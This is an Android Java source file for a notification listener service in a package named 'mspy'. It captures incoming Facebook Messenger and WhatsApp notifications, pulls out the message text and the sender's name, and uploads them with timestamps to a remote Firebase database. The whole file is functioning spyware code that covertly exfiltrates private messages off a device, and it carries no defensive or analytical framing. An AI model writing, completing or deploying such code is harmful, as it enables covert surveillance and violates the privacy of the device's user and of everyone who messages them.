package com.example.mspy;

import android.app.Notification;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class MyNotificationListenerService extends NotificationListenerService {
    final static String TAG = "rubelliumm";

//    @Override
//    public void onCreate() {
//        super.onCreate();
////        startForeground(1, new Notification());
//    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // Handle notification posted here
        Long time = sbn.getPostTime();
        Date date = new Date(time);
        Notification notification = sbn.getNotification();
        DatabaseReference d = FirebaseDatabase.getInstance().getReference("facebook messenger");
        d.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.hasChild("hello")){
//                    Log.d(TAG, "onDataChange: has child hello");
//                    d.child("hello").setValue("setting new value");
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
        if (sbn.getPackageName().equals("com.facebook.orca")){ // remove the ! sign to work.........
            if (notification != null && notification.extras != null){
                String extra_text = notification.extras.get(Notification.EXTRA_TEXT).toString(); //description
                String EXTRA_TITLE = notification.extras.getString(Notification.EXTRA_TITLE);
                if (!EXTRA_TITLE.equals("Chat heads active")){
                    try {
                        FirebaseDatabase db = FirebaseDatabase.getInstance();
                        DatabaseReference mref = db.getReference("facebook messenger");
                        Map<String, String> info = new HashMap<>();
                        info.put("Text",extra_text);
                        info.put("From",EXTRA_TITLE);
                        mref.child(String.valueOf(date)).setValue(info);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
        if (sbn.getPackageName().equals("com.whatsapp")){
            if (notification != null && notification.extras != null) {
                String extra_text = notification.extras.getString(Notification.EXTRA_TEXT).toString(); //description
                String EXTRA_TITLE = notification.extras.getString(Notification.EXTRA_TITLE);
                FirebaseDatabase db = FirebaseDatabase.getInstance();
                DatabaseReference mref = db.getReference("whatsapp message");
                Map<String, String> info = new HashMap<>();
                info.put("Text", extra_text);
                info.put("From", EXTRA_TITLE);
                try {
                    mref.child(String.valueOf(date)).setValue(info);
                } catch (Exception e) {
                    Log.e(TAG, "error: " + e);
                }
            }
        }
    }
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Handle notification removed here
//        Log.d(TAG, "onNotificationRemoved: noti removed...");
    }

    @Override
    public IBinder onBind(Intent intent) {
        Log.d(TAG, "onBind: main nls binded ");
        return super.onBind(intent);
    }

    @Override
    public boolean onUnbind(Intent intent) {
        Log.d(TAG, "onUnbind: main unbounded ");
        return super.onUnbind(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "onDestroy: main destroyed");
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        Log.d(TAG, "onListenerDisconnected: main disconnected.");
    }
}

